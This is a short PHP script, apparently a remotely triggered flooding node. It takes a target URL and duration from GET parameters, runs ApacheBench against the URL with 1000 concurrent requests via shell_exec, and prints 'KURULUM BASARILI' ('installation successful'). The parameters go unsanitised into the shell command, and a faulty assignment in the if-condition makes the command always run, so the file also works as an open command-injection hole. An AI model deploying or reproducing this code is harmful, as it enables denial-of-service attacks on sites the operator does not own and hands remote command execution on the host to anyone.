<?php



$sure = $_GET['sure'];
$url = $_GET['url'];

$cikti = "ab -n 1000 -c 1000  -s " .$sure. " " .$url;


if ( $sure = "" ) {

echo "KURULUM BASARILI";



} else {

$ext = shell_exec($cikti);
echo "<pre>$ext</pre>";


}






?>
